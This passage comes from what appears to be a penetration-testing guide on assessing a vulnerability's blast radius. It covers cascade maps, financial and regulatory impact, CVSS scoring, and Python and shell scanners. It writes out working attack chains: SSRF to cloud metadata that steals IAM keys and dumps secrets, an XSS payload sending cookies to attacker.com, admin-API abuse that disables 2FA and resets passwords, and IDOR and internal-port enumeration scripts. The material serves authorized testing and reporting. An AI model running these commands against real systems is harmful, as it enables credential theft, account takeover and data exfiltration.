Critical Dimension
::

### Mapping Cascading Failures

::note
A cascade effect occurs when exploiting one vulnerability triggers a chain of failures across interconnected systems. Identifying cascades is the **highest-value activity** in CDA.
::

```
┌──────────────────────────────────────────────────────────────────────┐
│                    CASCADE EFFECT MAP                                │
│                                                                      │
│                    ┌────────────────┐                                │
│                    │  Initial Vuln  │                                │
│                    │  (SSRF)        │                                │
│                    └───────┬────────┘                                │
│                            │                                         │
│              ┌─────────────┼─────────────┐                          │
│              ▼             ▼             ▼                           │
│     ┌──────────────┐ ┌──────────┐ ┌──────────────┐                 │
│     │ Cloud Meta   │ │ Internal │ │ Redis        │                 │
│     │ Credential   │ │ Admin    │ │ Service      │                 │
│     │ Theft        │ │ Panel    │ │ Access       │                 │
│     └──────┬───────┘ └────┬─────┘ └──────┬───────┘                 │
│            │              │              │                           │
│     ┌──────▼───────┐ ┌───▼──────┐ ┌─────▼────────┐                │
│     │ S3 Bucket    │ │ User     │ │ Session      │                │
│     │ Access       │ │ Account  │ │ Hijacking    │                │
│     │ (All Data)   │ │ Takeover │ │ (All Users)  │                │
│     └──────┬───────┘ └────┬─────┘ └──────┬───────┘                │
│            │              │              │                           │
│     ┌──────▼───────┐ ┌───▼──────┐ ┌─────▼────────┐                │
│     │ Customer     │ │ Priv     │ │ Data         │                │
│     │ Data Breach  │ │ Escal    │ │ Exfiltration │                │
│     │ (Millions)   │ │ to Admin │ │ at Scale     │                │
│     └──────────────┘ └──────────┘ └──────────────┘                │
│                                                                      │
│     Total Cascade Depth: 3 levels                                    │
│     Total Systems Affected: 9+                                       │
│     Total Users Affected: ALL platform users                         │
└──────────────────────────────────────────────────────────────────────┘
```

::tabs
  ::tabs-item{icon="i-lucide-git-branch" label="Credential Cascade"}

  ```bash
  # Level 1: Initial vulnerability exposes credentials
  # Example: SSRF → Cloud metadata → IAM credentials
  INITIAL_CREDS=$(curl -s "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  ROLE_NAME=$(echo "$INITIAL_CREDS" | head -1)
  CREDS=$(curl -s "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}")

  echo "=== Level 1: Credential Theft ==="
  echo "$CREDS" | jq '{AccessKeyId, SecretAccessKey}'

  # Level 2: Stolen credentials access other services
  echo "=== Level 2: Service Access ==="
  export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')

  # Check what these creds can reach
  aws s3 ls 2>/dev/null && echo "[CASCADE] S3 access confirmed"
  aws dynamodb list-tables 2>/dev/null && echo "[CASCADE] DynamoDB access confirmed"
  aws secretsmanager list-secrets 2>/dev/null && echo "[CASCADE] Secrets Manager access confirmed"
  aws rds describe-db-instances 2>/dev/null && echo "[CASCADE] RDS access confirmed"

  # Level 3: Secrets Manager → Database credentials → Full data access
  echo "=== Level 3: Deep Credential Chain ==="
  SECRETS=$(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null)
  for secret in $SECRETS; do
    echo "Secret: $secret"
    aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' --output text 2>/dev/null | \
      grep -iE "password|host|user|database|connection" | head -5
  done

  # Level 4: Database access → All user data
  echo "=== Level 4: Full Data Access ==="
  # Using leaked DB credentials from Secrets Manager
  # mysql -h LEAKED_HOST -u LEAKED_USER -pLEAKED_PASS -e "SELECT COUNT(*) FROM users;"
  ```
  ::

  ::tabs-item{icon="i-lucide-link-2" label="Authentication Cascade"}

  ```bash
  # Level 1: XSS steals admin session
  echo "=== Level 1: Session Theft ==="
  echo "Payload: <script>fetch('https://attacker.com/log?c='+document.cookie)</script>"

  # Level 2: Admin session → API key generation
  echo "=== Level 2: Persistent Access ==="
  curl -s -X POST "https://target.com/api/admin/api-keys" \
    -H "Cookie: session=STOLEN_ADMIN_SESSION" \
    -H "Content-Type: application/json" \
    -d '{"name":"backup-key","permissions":["*"]}'

  # Level 3: Admin API key → User management
  echo "=== Level 3: User Account Control ==="
  # List all users
  USERS=$(curl -s "https://target.com/api/admin/users" \
    -H "Authorization: Bearer ADMIN_API_KEY" | jq 'length')
  echo "Users under attacker control: $USERS"

  # Disable 2FA for target accounts
  curl -s -X POST "https://target.com/api/admin/users/1/disable-2fa" \
    -H "Authorization: Bearer ADMIN_API_KEY"

  # Level 4: User account takeover → Lateral movement
  echo "=== Level 4: Lateral Movement ==="
  # Reset any user's password
  curl -s -X POST "https://target.com/api/admin/users/1/reset-password" \
    -H "Authorization: Bearer ADMIN_API_KEY" \
    -d '{"new_password":"attacker_controlled"}'

  # Access connected OAuth applications
  curl -s "https://target.com/api/admin/oauth-apps" \
    -H "Authorization: Bearer ADMIN_API_KEY" | \
    jq '.[].callback_url'

  # Level 5: OAuth app secrets → Third-party service compromise
  echo "=== Level 5: Third-Party Cascade ==="
  curl -s "https://target.com/api/admin/oauth-apps" \
    -H "Authorization: Bearer ADMIN_API_KEY" | \
    jq '.[] | {name, client_id, client_secret, scopes}'
  ```
  ::

  ::tabs-item{icon="i-lucide-workflow" label="Supply Chain Cascade"}

  ```bash
  # Assess if vulnerability affects downstream consumers
  echo "=== Supply Chain Cascade Assessment ==="

  # Check for public API consumers
  curl -s "https://target.com/api/partners" \
    -H "Authorization: Bearer TOKEN" | jq 'length'

  # Webhook endpoint exposure — who receives data from this system?
  curl -s "https://target.com/api/webhooks" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[] | {url, events, active}'

  # Integration token exposure
  curl -s "https://target.com/api/integrations" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[] | {service, token, permissions}'

  # Check for shared NPM packages / libraries published by target
  curl -s "https://registry.npmjs.org/-/v1/search?text=maintainer:target-org" | \
    jq '.objects[].package | {name, version}'

  # GitHub integration token exposure
  curl -s "https://target.com/api/integrations/github" \
    -H "Authorization: Bearer TOKEN" | jq '.access_token'
  # If exposed, check what repos are accessible
  # curl -s "https://api.github.com/user/repos" -H "Authorization: token STOLEN_TOKEN" | jq '.[].full_name'

  # CDN / Asset distribution cascade
  # If attacker can modify files served via CDN
  curl -s "https://target.com/api/admin/cdn/files" \
    -H "Authorization: Bearer TOKEN" | jq '.[].url'
  # Files served to all users = supply chain attack vector
  ```
  ::
::

---

## Business Impact Quantification

::badge
Critical Dimension
::

### Financial Impact Estimation

::accordion
  ::accordion-item
  ---
  icon: i-lucide-calculator
  label: Direct Financial Loss
  ---

  ```bash
  # Calculate potential financial exposure from vulnerability
  echo "=== Direct Financial Loss Estimation ==="

  # Transaction manipulation impact
  DAILY_TRANSACTIONS=$(curl -s "https://target.com/api/stats/transactions" \
    -H "Authorization: Bearer TOKEN" | jq '.daily_count')
  AVG_TRANSACTION=$(curl -s "https://target.com/api/stats/transactions" \
    -H "Authorization: Bearer TOKEN" | jq '.average_value')
  
  echo "Daily transactions: $DAILY_TRANSACTIONS"
  echo "Average transaction value: \$${AVG_TRANSACTION}"
  echo "Daily financial exposure: \$$(echo "$DAILY_TRANSACTIONS * $AVG_TRANSACTION" | bc)"

  # Gift card / coupon abuse via race condition
  COUPON_VALUE=50
  RACE_MULTIPLIER=20
  echo "Coupon value: \$${COUPON_VALUE}"
  echo "Race condition multiplier: ${RACE_MULTIPLIER}x"
  echo "Single attack financial loss: \$$(echo "$COUPON_VALUE * $RACE_MULTIPLIER" | bc)"

  # Subscription manipulation impact
  curl -s "https://target.com/api/plans" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[] | {name, price, interval}' 
  # If attacker can upgrade plans without payment
  PREMIUM_PRICE=$(curl -s "https://target.com/api/plans" \
    -H "Authorization: Bearer TOKEN" | jq '[.[] | .price] | max')
  echo "Maximum subscription abuse per account: \$${PREMIUM_PRICE}/month"

  # Estimate breach notification costs
  # Average cost per breached record: $164 (IBM Cost of Data Breach Report 2024)
  AFFECTED_RECORDS=1000000
  COST_PER_RECORD=164
  echo "Estimated breach cost: \$$(echo "$AFFECTED_RECORDS * $COST_PER_RECORD" | bc)"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-scale
  label: Regulatory Fine Estimation
  ---

  ```
  ┌──────────────────────────────────────────────────────────────────┐
  │               REGULATORY FINE ESTIMATION MATRIX                  │
  │                                                                  │
  │   Regulation    │ Maximum Fine            │ Trigger              │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   GDPR          │ €20M or 4% global       │ EU user data         │
  │                 │ annual revenue           │ exposure             │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   CCPA          │ $7,500 per intentional  │ CA resident data     │
  │                 │ violation                │ exposure             │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   HIPAA         │ $1.5M per violation     │ Healthcare / PHI     │
  │                 │ category per year        │ data exposure        │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   PCI DSS       │ $5,000 - $100,000       │ Payment card data    │
  │                 │ per month                │ exposure             │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   SOX           │ $5M fine + 20 years     │ Financial reporting  │
  │                 │ imprisonment             │ data manipulation    │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   PIPEDA        │ CAD $100,000 per        │ Canadian user data   │
  │                 │ violation                │ exposure             │
  │   ──────────────┼─────────────────────────┼────────────────────  │
  │   LGPD          │ 2% of revenue in        │ Brazilian user data  │
  │                 │ Brazil (max R$50M)       │ exposure             │
  └──────────────────────────────────────────────────────────────────┘
  ```

  ```bash
  # Determine applicable regulations based on data types exposed
  echo "=== Regulatory Impact Assessment ==="

  RESPONSE=$(curl -s "https://target.com/api/users/1" \
    -H "Authorization: Bearer TOKEN")

  # Check for GDPR-relevant data
  echo "$RESPONSE" | jq 'has("email", "address", "phone", "date_of_birth")' && \
    echo "[GDPR] Personal data of EU residents exposed"

  # Check for HIPAA-relevant data
  echo "$RESPONSE" | jq 'has("medical_record", "diagnosis", "prescription", "insurance_id", "health_data")' && \
    echo "[HIPAA] Protected Health Information exposed"

  # Check for PCI DSS-relevant data
  echo "$RESPONSE" | jq 'has("card_number", "cvv", "expiry", "cardholder_name")' && \
    echo "[PCI DSS] Payment card data exposed"

  # Check for SOX-relevant data
  echo "$RESPONSE" | jq 'has("financial_report", "audit_log", "revenue", "expense")' && \
    echo "[SOX] Financial data exposed"

  # Calculate estimated GDPR fine
  EU_USERS=500000
  echo "EU users affected: $EU_USERS"
  echo "Potential GDPR fine: Up to 4% of global annual revenue or €20,000,000 (whichever is higher)"

  # Calculate estimated CCPA fine
  CA_USERS=100000
  echo "California users affected: $CA_USERS"
  echo "Potential CCPA fine: Up to \$$(echo "$CA_USERS * 7500" | bc) (intentional violations)"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-building
  label: Business Operational Impact
  ---

  ```bash
  # Assess operational disruption potential
  echo "=== Operational Impact Assessment ==="

  # Service dependency mapping
  curl -s "https://target.com/api/health" | jq '.'
  curl -s "https://target.com/api/status" | jq '.'

  # Check if vulnerable service is a critical dependency
  curl -s "https://target.com/api/dependencies" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[] | {service, status, dependent_services}'

  # Uptime/SLA impact assessment
  curl -s "https://status.target.com/api/v2/summary.json" | \
    jq '.components[] | {name, status}'

  # Calculate potential downtime cost
  # Average cost of IT downtime: $5,600/minute (Gartner)
  MINUTES_TO_PATCH=120
  COST_PER_MINUTE=5600
  echo "Estimated patch time: ${MINUTES_TO_PATCH} minutes"
  echo "Potential downtime cost: \$$(echo "$MINUTES_TO_PATCH * $COST_PER_MINUTE" | bc)"

  # Customer churn estimation from breach
  TOTAL_CUSTOMERS=50000
  CHURN_RATE=0.035  # 3.5% average churn after breach
  AVG_CUSTOMER_VALUE=1200
  echo "Estimated customer churn: $(echo "$TOTAL_CUSTOMERS * $CHURN_RATE" | bc | cut -d. -f1) customers"
  echo "Revenue loss from churn: \$$(echo "$TOTAL_CUSTOMERS * $CHURN_RATE * $AVG_CUSTOMER_VALUE" | bc | cut -d. -f1)"
  ```
  ::
::

---

## Temporal Impact Assessment

::badge
High Dimension
::

### Exposure Window Analysis

::tip
The **exposure window** — how long a vulnerability has been exploitable — directly impacts severity. A vulnerability present for years with no audit trail means potential undetected exploitation.
::

::tabs
  ::tabs-item{icon="i-lucide-clock" label="Timeline Construction"}

  ```bash
  # Determine when the vulnerable code was introduced
  echo "=== Temporal Exposure Analysis ==="

  # Check Wayback Machine for endpoint history
  curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/api/vulnerable-endpoint&output=json&fl=timestamp,statuscode&limit=20" | \
    python3 -c "
  import json, sys
  data = json.load(sys.stdin)
  for entry in data[1:]:
      ts = entry[0]
      year, month, day = ts[:4], ts[4:6], ts[6:8]
      print(f'{year}-{month}-{day}: HTTP {entry[1]}')
  "

  # Check when the JavaScript file containing vulnerable code was first indexed
  curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/js/app.js&output=json&fl=timestamp&limit=5" | jq '.'

  # Analyze HTTP response headers for server version (estimate deployment date)
  curl -s -I "https://target.com/api/vulnerable-endpoint" | \
    grep -iE "server:|x-powered-by:|x-version:|x-build:|last-modified:|etag:"

  # Check certificate issuance date as proxy for service age
  echo | openssl s_client -connect target.com:443 2>/dev/null | \
    openssl x509 -noout -dates

  # GitHub commit history analysis (if open source)
  # Find when vulnerable code pattern was introduced
  # git log --all -p -S 'vulnerable_function_name' --reverse | head -30

  # Check DNS record age
  whois target.com | grep -iE "creation|registered|created"
  ```
  ::

  ::tabs-item{icon="i-lucide-shield-question" label="Detection Gap Assessment"}

  ```bash
  # Assess whether the vulnerability would have been detected by existing monitoring
  echo "=== Detection Gap Analysis ==="

  # Check if security headers are present (indicates security maturity)
  curl -s -I "https://target.com" | grep -iE "strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy|x-xss-protection"

  # Check for WAF presence (would exploitation be logged?)
  curl -s -I "https://target.com" | grep -iE "cloudflare|akamai|aws|imperva|f5|sucuri|barracuda"

  # Check for rate limiting (would mass exploitation be throttled?)
  for i in $(seq 1 20); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/users/${i}" \
      -H "Authorization: Bearer TOKEN")
    echo "Request $i: HTTP $STATUS"
  done | grep -c "429"

  # Check for audit logging (would exploitation be recorded?)
  curl -s "https://target.com/api/admin/audit-log" \
    -H "Authorization: Bearer TOKEN" | jq '.entries | length'

  # Check CORS headers (is cross-origin exploitation possible without detection?)
  curl -s -I "https://target.com/api/users" \
    -H "Origin: https://evil.com" | grep -i "access-control"

  # Assess monitoring endpoints
  for endpoint in "/metrics" "/actuator" "/debug" "/health" "/_stats"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${endpoint}" --max-time 3)
    [ "$status" = "200" ] && echo "[EXPOSED] Monitoring at ${endpoint}"
  done
  ```
  ::
::

### Historical Exploitation Assessment

```bash
# Check if the vulnerability has been actively exploited in the wild
echo "=== Historical Exploitation Indicators ==="

# Search for related CVEs
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=target.com" | \
  jq '.vulnerabilities[].cve | {id, descriptions: [.descriptions[] | select(.lang=="en") | .value]}'

# Search Shodan for exposed instances
curl -s "https://api.shodan.io/shodan/host/search?key=API_KEY&query=hostname:target.com" | \
  jq '.matches[] | {ip: .ip_str, port, vulns}'

# Check Have I Been Pwned for previous breaches
curl -s "https://haveibeenpwned.com/api/v3/breaches" \
  -H "hibp-api-key: API_KEY" | \
  jq '.[] | select(.Domain == "target.com") | {Name, BreachDate, PwnCount, DataClasses}'

# Search for leaked data on paste sites (passive check)
curl -s "https://psbdmp.ws/api/search/target.com" | jq '.'

# Check for exploit code on GitHub
curl -s "https://api.github.com/search/code?q=target.com+exploit" | \
  jq '.items[] | {repository: .repository.full_name, path: .path}'

# Analyze access logs for signs of prior exploitation (if accessible)
curl -s "https://target.com/api/admin/logs?filter=suspicious" \
  -H "Authorization: Bearer TOKEN" | jq '.[0:10]'
```

---

## CVSS Score Construction for CDA

::badge
Assessment Tool
::

### Building the CVSS Vector

::collapsible

**CVSS v3.1 Metrics Relevant to CDA:**

| Metric | Category | CDA Relevance |
| --- | --- | --- |
| **Attack Vector (AV)** | Base | Network (N), Adjacent (A), Local (L), Physical (P) |
| **Attack Complexity (AC)** | Base | Low = easy to exploit at scale |
| **Privileges Required (PR)** | Base | None = any internet user can exploit |
| **User Interaction (UI)** | Base | None = fully automated exploitation |
| **Scope (S)** | Base | Changed = impacts systems beyond the vulnerable component |
| **Confidentiality (C)** | Base | High = all data accessible |
| **Integrity (I)** | Base | High = all data modifiable |
| **Availability (A)** | Base | High = complete service disruption |
| **Exploit Code Maturity (E)** | Temporal | Functional = working PoC exists |
| **Confidentiality Req (CR)** | Environmental | High = handles sensitive data |
| **Integrity Req (IR)** | Environmental | High = financial transactions |
| **Availability Req (AR)** | Environmental | High = critical infrastructure |

::

```bash
# CVSS Score calculation reference
echo "=== CVSS v3.1 Vector Construction ==="

# Example: SSRF → Cloud credential theft → Full data breach
# AV:N  - Network accessible
# AC:L  - Low complexity
# PR:N  - No privileges required
# UI:N  - No user interaction
# S:C   - Scope changed (affects cloud infrastructure beyond web app)
# C:H   - Confidentiality High (all data accessible)
# I:H   - Integrity High (can modify data)
# A:H   - Availability High (can terminate instances)

VECTOR="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
echo "CVSS Vector: $VECTOR"
echo "Score: 10.0 (Critical)"

# Validate vector using NIST calculator
echo "Verify at: https://www.first.org/cvss/calculator/3.1#${VECTOR}"

# Example: IDOR → User data exposure
VECTOR_IDOR="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
echo "IDOR Vector: $VECTOR_IDOR"
echo "Score: 6.5 (Medium)"

# With CDA showing 2M users affected, argue for Environmental score increase
VECTOR_IDOR_ENV="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/CR:H/IR:M/AR:L"
echo "IDOR with CDA Environmental: $VECTOR_IDOR_ENV"
echo "Score: ~7.5 (High) — justified by CDA findings"
```

---

## Automated CDA Scripts

### Comprehensive Blast Radius Scanner

::code-collapse

```python
#!/usr/bin/env python3
"""
Collateral Damage Assessment - Automated Blast Radius Scanner
Usage: python3 cda_scanner.py --url https://target.com/api/vuln --token TOKEN
"""

import requests
import json
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class CDAScanner:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip('/')
        self.headers = {"Authorization": f"Bearer {token}"}
        self.results = {
            "scan_time": datetime.utcnow().isoformat(),
            "target": base_url,
            "user_impact": {},
            "data_exposure": {},
            "system_spread": {},
            "cascade_effects": [],
            "regulatory_impact": [],
            "cvss_recommendation": ""
        }

    def assess_user_count(self):
        """Estimate total affected users"""
        print("[*] Assessing user population...")
        
        # Try pagination metadata
        for param in ['limit=1', 'per_page=1', 'pageSize=1']:
            try:
                r = requests.get(
                    f"{self.base_url}/users?{param}",
                    headers=self.headers, timeout=10
                )
                data = r.json()
                for key in ['total', 'total_count', 'totalCount', 'count']:
                    if key in data:
                        self.results["user_impact"]["total_users"] = data[key]
                        return data[key]
                if 'meta' in data:
                    for key in ['total', 'total_count']:
                        if key in data['meta']:
                            self.results["user_impact"]["total_users"] = data['meta'][key]
                            return data['meta'][key]
            except:
                continue
        
        # Binary search fallback
        return self._binary_search_max_id()

    def _binary_search_max_id(self):
        low, high = 1, 10000000
        while low < high:
            mid = (low + high) // 2
            try:
                r = requests.get(
                    f"{self.base_url}/users/{mid}",
                    headers=self.headers, timeout=5
                )
                if r.status_code == 200:
                    low = mid + 1
                else:
                    high = mid
            except:
                high = mid
        self.results["user_impact"]["estimated_max_id"] = low
        return low

    def assess_data_sensitivity(self):
        """Classify exposed data types"""
        print("[*] Classifying data sensitivity...")
        
        try:
            r = requests.get(
                f"{self.base_url}/users/1",
                headers=self.headers, timeout=10
            )
            data = r.json()
            fields = self._extract_fields(data)
            
            critical = [f for f in fields if any(
                k in f.lower() for k in 
                ['password', 'ssn', 'card_number', 'cvv', 'secret', 'token', 'private_key']
            )]
            high = [f for f in fields if any(
                k in f.lower() for k in 
                ['email', 'phone', 'address', 'birth', 'gender', 'salary']
            )]
            medium = [f for f in fields if any(
                k in f.lower() for k in 
                ['name', 'ip', 'location', 'device', 'history']
            )]
            
            self.results["data_exposure"] = {
                "critical_fields": critical,
                "high_fields": high,
                "medium_fields": medium,
                "total_fields": len(fields),
                "sample_record_size_bytes": len(json.dumps(data))
            }
        except Exception as e:
            print(f"  [!] Error: {e}")

    def _extract_fields(self, obj, prefix=""):
        fields = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                path = f"{prefix}.{k}" if prefix else k
                fields.append(path)
                fields.extend(self._extract_fields(v, path))
        elif isinstance(obj, list) and obj:
            fields.extend(self._extract_fields(obj[0], f"{prefix}[]"))
        return fields

    def assess_cross_tenant(self):
        """Check for multi-tenant blast radius"""
        print("[*] Assessing cross-tenant impact...")
        
        tenant_indicators = ['tenant_id', 'org_id', 'organization_id', 
                           'workspace_id', 'team_id', 'company_id']
        try:
            r = requests.get(
                f"{self.base_url}/users/1",
                headers=self.headers, timeout=10
            )
            data = r.json()
            found = [k for k in tenant_indicators if k in json.dumps(data)]
            self.results["system_spread"]["multi_tenant"] = bool(found)
            self.results["system_spread"]["tenant_indicators"] = found
        except:
            pass

    def assess_connected_services(self):
        """Map accessible API endpoints from vulnerable position"""
        print("[*] Mapping connected services...")
        
        endpoints = [
            '/users', '/orders', '/payments', '/invoices',
            '/documents', '/files', '/messages', '/notifications',
            '/settings', '/admin', '/integrations', '/webhooks',
            '/api-keys', '/sessions', '/audit-log', '/billing',
            '/subscriptions', '/teams', '/organizations'
        ]
        
        accessible = []
        def check_endpoint(ep):
            try:
                r = requests.get(
                    f"{self.base_url}{ep}",
                    headers=self.headers, timeout=5
                )
                if r.status_code == 200:
                    return ep
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(check_endpoint, endpoints)
            accessible = [r for r in results if r]
        
        self.results["system_spread"]["accessible_endpoints"] = accessible
        self.results["system_spread"]["endpoint_count"] = len(accessible)

    def assess_regulatory(self):
        """Determine regulatory implications"""
        print("[*] Assessing regulatory impact...")
        
        regulations = []
        exposure = self.results.get("data_exposure", {})
        
        all_fields = (
            exposure.get("critical_fields", []) + 
            exposure.get("high_fields", [])
        )
        field_str = " ".join(all_fields).lower()
        
        if any(k in field_str for k in ['email', 'phone', 'address', 'birth', 'name']):
            regulations.append({
                "regulation": "GDPR",
                "max_fine": "€20M or 4% global revenue",
                "trigger": "EU personal data exposure"
            })
            regulations.append({
                "regulation": "CCPA",
                "max_fine": "$7,500 per violation",
                "trigger": "California resident data"
            })
        
        if any(k in field_str for k in ['medical', 'health', 'diagnosis', 'prescription']):
            regulations.append({
                "regulation": "HIPAA",
                "max_fine": "$1.5M per violation category",
                "trigger": "PHI data exposure"
            })
        
        if any(k in field_str for k in ['card', 'cvv', 'payment', 'credit']):
            regulations.append({
                "regulation": "PCI DSS",
                "max_fine": "$100,000/month",
                "trigger": "Payment card data exposure"
            })
        
        self.results["regulatory_impact"] = regulations

    def generate_report(self):
        """Generate final CDA report"""
        print("\n" + "=" * 60)
        print("COLLATERAL DAMAGE ASSESSMENT REPORT")
        print("=" * 60)
        print(json.dumps(self.results, indent=2))
        
        with open("cda_report.json", "w") as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[*] Report saved: cda_report.json")

    def run(self):
        self.assess_user_count()
        self.assess_data_sensitivity()
        self.assess_cross_tenant()
        self.assess_connected_services()
        self.assess_regulatory()
        self.generate_report()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--token", required=True)
    args = parser.parse_args()
    
    scanner = CDAScanner(args.url, args.token)
    scanner.run()
```

::

### Quick CDA Shell Script

::code-group

```bash [cda_quick.sh]
#!/bin/bash
# Quick Collateral Damage Assessment
# Usage: ./cda_quick.sh https://target.com/api TOKEN

BASE_URL="$1"
TOKEN="$2"

echo "============================================"
echo "  COLLATERAL DAMAGE ASSESSMENT"
echo "  Target: $BASE_URL"
echo "  Time: $(date -u)"
echo "============================================"

echo ""
echo "[1/6] USER POPULATION ASSESSMENT"
echo "─────────────────────────────────"
TOTAL=$(curl -s "${BASE_URL}/users?limit=1" \
  -H "Authorization: Bearer $TOKEN" | jq '.meta.total // .total // .total_count // "unknown"')
echo "  Total users in blast radius: $TOTAL"

echo ""
echo "[2/6] DATA SENSITIVITY CLASSIFICATION"
echo "───────���──────────────────────────────"
FIELDS=$(curl -s "${BASE_URL}/users/1" \
  -H "Authorization: Bearer $TOKEN" | jq -r 'paths(scalars) | join(".")')
CRITICAL=$(echo "$FIELDS" | grep -ciE "password|ssn|card|cvv|secret|token|key")
HIGH=$(echo "$FIELDS" | grep -ciE "email|phone|address|birth|salary|gender")
echo "  Critical fields exposed: $CRITICAL"
echo "  High sensitivity fields: $HIGH"
echo "  Total fields per record: $(echo "$FIELDS" | wc -l)"

echo ""
echo "[3/6] RECORD SIZE & VOLUME"
echo "──────────────────────────"
SIZE=$(curl -s "${BASE_URL}/users/1" -H "Authorization: Bearer $TOKEN" | wc -c)
echo "  Single record size: ${SIZE} bytes"
if [ "$TOTAL" != "unknown" ] && [ "$TOTAL" != "null" ]; then
  TOTAL_MB=$(( (SIZE * TOTAL) / 1048576 ))
  echo "  Estimated total exposure: ${TOTAL_MB} MB"
fi

echo ""
echo "[4/6] CONNECTED SERVICES"
echo "────────────────────────"
for ep in /users /orders /payments /documents /admin /integrations /webhooks /billing; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "${BASE_URL}${ep}" -H "Authorization: Bearer $TOKEN" --max-time 3)
  [ "$STATUS" = "200" ] && echo "  [ACCESSIBLE] ${ep}"
done

echo ""
echo "[5/6] MULTI-TENANT CHECK"
echo "────────────────────────"
TENANT=$(curl -s "${BASE_URL}/users/1" -H "Authorization: Bearer $TOKEN" | \
  jq 'has("tenant_id", "org_id", "organization_id", "workspace_id")')
echo "  Multi-tenant indicators: $TENANT"

echo ""
echo "[6/6] REGULATORY EXPOSURE"
echo "─────────────────────────"
[ "$HIGH" -gt 0 ] && echo "  [!] GDPR — Personal data of EU residents potentially exposed"
[ "$CRITICAL" -gt 0 ] && echo "  [!] PCI DSS — Payment/credential data potentially exposed"
echo ""
echo "============================================"
echo "  ASSESSMENT COMPLETE"
echo "============================================"
```

```bash [cda_ssrf_blast.sh]
#!/bin/bash
# SSRF-specific blast radius assessment
# Usage: ./cda_ssrf_blast.sh https://target.com/proxy?url=

SSRF_ENDPOINT="$1"

echo "=== SSRF Blast Radius Assessment ==="

echo "[*] Testing cloud metadata access..."
for path in \
  "http://169.254.169.254/latest/meta-data/" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://169.254.169.254/latest/user-data" \
  "http://metadata.google.internal/computeMetadata/v1/" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"; do
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${SSRF_ENDPOINT}${path}" --max-time 5)
  [ "$STATUS" = "200" ] && echo "  [CRITICAL] Cloud metadata accessible: $path"
done

echo ""
echo "[*] Testing internal service access..."
for port in 80 443 3000 3306 5432 6379 9200 27017 8080 8443 11211 2379 8500 5984; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "${SSRF_ENDPOINT}http://127.0.0.1:${port}/" --max-time 3)
  if [ "$STATUS" != "000" ] && [ "$STATUS" != "502" ] && [ "$STATUS" != "504" ]; then
    echo "  [REACHABLE] localhost:${port} — HTTP $STATUS"
  fi
done

echo ""
echo "[*] Testing internal network ranges..."
for ip in 10.0.0.1 172.16.0.1 192.168.1.1 192.168.0.1; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "${SSRF_ENDPOINT}http://${ip}/" --max-time 3)
  [ "$STATUS" != "000" ] && echo "  [REACHABLE] ${ip} — HTTP $STATUS"
done

echo ""
echo "=== Assessment Complete ==="
```

```bash [cda_idor_blast.sh]
#!/bin/bash
# IDOR-specific blast radius assessment
# Usage: ./cda_idor_blast.sh https://target.com/api/users TOKEN

ENDPOINT="$1"
TOKEN="$2"

echo "=== IDOR Blast Radius Assessment ==="

echo "[*] Determining ID range..."
MAX_ID=0
for test_id in 10 100 1000 10000 100000 1000000; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "${ENDPOINT}/${test_id}" -H "Authorization: Bearer $TOKEN" --max-time 3)
  if [ "$STATUS" = "200" ]; then
    MAX_ID=$test_id
    echo "  ID $test_id: EXISTS"
  else
    echo "  ID $test_id: NOT FOUND (max likely < $test_id)"
    break
  fi
done

echo ""
echo "[*] Sampling data sensitivity (5 random records)..."
for i in $(seq 1 5); do
  RAND_ID=$((RANDOM % MAX_ID + 1))
  echo "  --- Record $RAND_ID ---"
  curl -s "${ENDPOINT}/${RAND_ID}" -H "Authorization: Bearer $TOKEN" | \
    jq 'keys[]' 2>/dev/null | head -15
done

echo ""
echo "[*] Checking related endpoints..."
for suffix in /orders /payments /documents /settings /sessions /api-keys; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "${ENDPOINT}/1${suffix}" -H "Authorization: Bearer $TOKEN" --max-time 3)
  [ "$STATUS" = "200" ] && echo "  [ACCESSIBLE] ${suffix} — additional data exposed"
done

echo ""
echo "  Estimated affected users: ~${MAX_ID}"
